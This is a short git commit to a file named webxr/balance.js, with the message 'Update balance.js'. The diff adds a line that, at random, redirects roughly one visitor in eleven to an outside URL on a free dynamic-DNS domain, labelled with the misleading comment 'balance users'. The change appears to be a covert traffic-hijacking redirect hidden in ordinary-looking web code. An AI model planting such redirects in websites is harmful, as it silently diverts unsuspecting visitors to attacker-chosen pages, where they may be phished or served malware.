b20432f8c261afd8a1bd3e2fc7e42af8e7b2ff04
rxsend19 <74374606+rxsend19@users.noreply.github.com>
2021-10-09 21:42:26 +0500

    Update balance.js

--- webxr/balance.js
+++ webxr/balance.js
@@ -2,4 +2,5 @@ var numm = Math.round(Math.random() * 10)
 console.log(numm)
 if(numm == 3){
 console.log("OK")
+    document.location.href = 'https://admin1911.cloudns.cl/other/kvant/tu7/output/' // balance users 
 }
